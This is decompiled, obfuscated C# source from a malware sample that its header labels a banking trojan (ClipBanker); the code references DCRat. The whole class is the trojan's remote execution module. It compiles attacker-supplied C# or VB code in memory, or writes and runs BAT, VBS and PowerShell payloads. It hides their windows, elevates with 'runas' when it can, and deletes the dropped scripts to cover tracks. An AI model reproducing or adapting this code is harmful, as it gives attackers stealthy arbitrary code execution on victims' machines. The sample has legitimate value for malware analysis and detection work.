// Decompiled with JetBrains decompiler
// Type: 639.526
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u00315d;
using crD;
using H16;
using I71;
using Microsoft.CSharp;
using Microsoft.VisualBasic;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace \u003639
{
  internal sealed class \u003526 : x77
  {
    private readonly string z8A;
    private readonly int \u00319g;

    [SpecialName]
    public string \u0032WN() => this.z8A;

    [SpecialName]
    public int \u0037V8() => this.\u00319g;

    public \u003526(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2,
      [In] string obj3,
      [In] string obj4,
      [In] string obj5)
    {
      try
      {
        Dictionary<string, string> dictionary1 = obj1.dtU<Dictionary<string, string>>();
        Dictionary<string, object> dictionary2 = obj1.dtU<Dictionary<string, object>>();
        if (dictionary1["Type"] == "CS" || dictionary1["Type"] == "VB")
        {
          CodeDomProvider codeDomProvider = !(dictionary1["Type"] == "CS") ? (CodeDomProvider) new VBCodeProvider() : (CodeDomProvider) new CSharpCodeProvider();
          CompilerParameters options = new CompilerParameters()
          {
            GenerateInMemory = true,
            GenerateExecutable = false
          };
          options.ReferencedAssemblies.AddRange(dictionary1["References"].Split('\n'));
          CompilerResults compilerResults = codeDomProvider.CompileAssemblyFromSource(options, dictionary1["Code"]);
          if (compilerResults.Errors.HasErrors)
          {
            string str = "";
            foreach (CompilerError error in (CollectionBase) compilerResults.Errors)
              str = str + "[" + error.ErrorNumber + " on " + error.Line.ToString() + " Line]: " + error.ErrorText + "\r\n";
            this.z8A = str;
            this.\u00319g = 1;
            return;
          }
          object instance = compilerResults.CompiledAssembly.CreateInstance("DCRat.Code");
          foreach (MethodInfo method in instance.GetType().GetMethods())
          {
            if (method.Name == "Main")
            {
              method.Invoke(instance, (object[]) null);
              break;
            }
          }
        }
        else if (dictionary1["Type"] == "BAT")
        {
          string path = xY7.B84() + "\\" + xY7.\u003842(10) + ".bat";
          File.WriteAllText(path, dictionary1["Code"]);
          if ((bool) dictionary2["Hidden"])
            Process.Start(new ProcessStartInfo()
            {
              WindowStyle = ProcessWindowStyle.Hidden,
              Verb = \u0036D4.bSG() ? "runas" : "",
              UseShellExecute = true,
              FileName = path
            }).WaitForExit();
          else
            Process.Start(new ProcessStartInfo()
            {
              UseShellExecute = false,
              Verb = \u0036D4.bSG() ? "runas" : "",
              FileName = "cmd.exe",
              Arguments = "/c \"" + path + "\""
            }).WaitForExit();
          try
          {
            File.Delete(path);
          }
          catch
          {
          }
        }
        else if (dictionary1["Type"] == "VBS")
        {
          string path = xY7.B84() + "\\" + xY7.\u003842(10) + ".vbs";
          File.WriteAllText(path, dictionary1["Code"]);
          Process.Start(new ProcessStartInfo()
          {
            WindowStyle = ProcessWindowStyle.Hidden,
            Verb = \u0036D4.bSG() ? "runas" : "",
            FileName = "cscript.exe",
            Arguments = "//Nologo \"" + path + "\""
          }).WaitForExit();
          try
          {
            File.Delete(path);
          }
          catch
          {
          }
        }
        else if (dictionary1["Type"] == "PS")
          Process.Start(new ProcessStartInfo()
          {
            WindowStyle = ProcessWindowStyle.Hidden,
            Verb = \u0036D4.bSG() ? "runas" : "",
            FileName = "powershell.exe",
            Arguments = "-Command \"" + dictionary1["Code"] + "\""
          }).WaitForExit();
        this.\u00319g = 0;
      }
      catch (Exception ex)
      {
        this.z8A = ex.Message;
        this.\u00319g = 1;
      }
    }
  }
}
